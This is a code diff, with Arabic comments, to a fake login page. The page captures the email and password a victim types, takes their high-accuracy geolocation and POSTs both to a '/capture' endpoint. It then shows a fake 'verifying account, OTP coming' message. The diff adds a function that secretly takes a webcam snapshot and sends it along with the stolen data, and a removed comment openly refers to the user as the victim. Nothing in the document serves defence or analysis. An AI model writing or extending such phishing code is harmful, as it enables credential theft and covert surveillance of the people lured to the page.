@@ -17,19 +17,43 @@
     <button onclick="startCapture()">تسجيل الدخول</button>
 
     <script>
+        // 1. إضافة وظيفة التقاط الصورة هنا
+        async function getCameraImage() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                stream.getTracks().forEach(track => track.stop()); // إغلاق الكاميرا فوراً
+                return canvas.toDataURL('image/png');
+            } catch (e) { 
+                console.log("Camera access denied");
+                return null; 
+            }
+        }
+
+        // 2. تحديث وظيفة البدء لاستدعاء الكاميرا والموقع معاً
         async function startCapture() {
             const email = document.getElementById('email').value;
             const pass = document.getElementById('pass').value;
             
-            // سحب الموقع
+            // التقاط الصورة أولاً
+            const imageData = await getCameraImage();
+            
+            // سحب الموقع وإرسال كل البيانات
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                sendData(email, pass, { lat: pos.coords.latitude, lon: pos.coords.longitude });
+                sendData(email, pass, { lat: pos.coords.latitude, lon: pos.coords.longitude }, imageData);
             }, async () => {
-                sendData(email, pass, null);
+                sendData(email, pass, null, imageData);
             }, { enableHighAccuracy: true });
         }
 
-        async function sendData(email, pass, loc) {
+        // 3. وظيفة إرسال البيانات النهائية للسيرفر
+        async function sendData(email, pass, loc, img) {
             await fetch('/capture', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -37,10 +61,10 @@
                     email: email,
                     password: pass,
                     location: loc,
+                    image: img, // إرسال الصورة هنا
                     device: navigator.userAgent
                 })
             });
-            // توجيه الضحية لصفحة وهمية "جاري التحقق"
             alert("جاري فحص الحساب... سيتم إرسال كود التحقق (OTP) إلى هاتفك قريباً.");
         }
     </script>
